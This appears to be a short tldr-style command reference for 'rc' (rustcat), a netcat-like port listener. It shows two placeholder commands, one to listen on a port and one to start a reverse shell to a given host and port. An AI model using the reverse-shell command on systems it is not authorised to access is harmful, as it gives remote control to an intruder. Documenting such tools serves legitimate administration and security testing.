# rc

> A modern port listener & Reverse Shell which is simplistic.
> Similar to `nc`.
> Similair to `nc` with an emphasis on ease of use.
> More information: <https://github.com/robiot/rustcat/wiki/Basic-Usage>.

- Start listening to a specific port:

`rc -lp {{port}}`

- Start a reverse shell:

`rc {{host}} {{port}} -r {{shell}}`
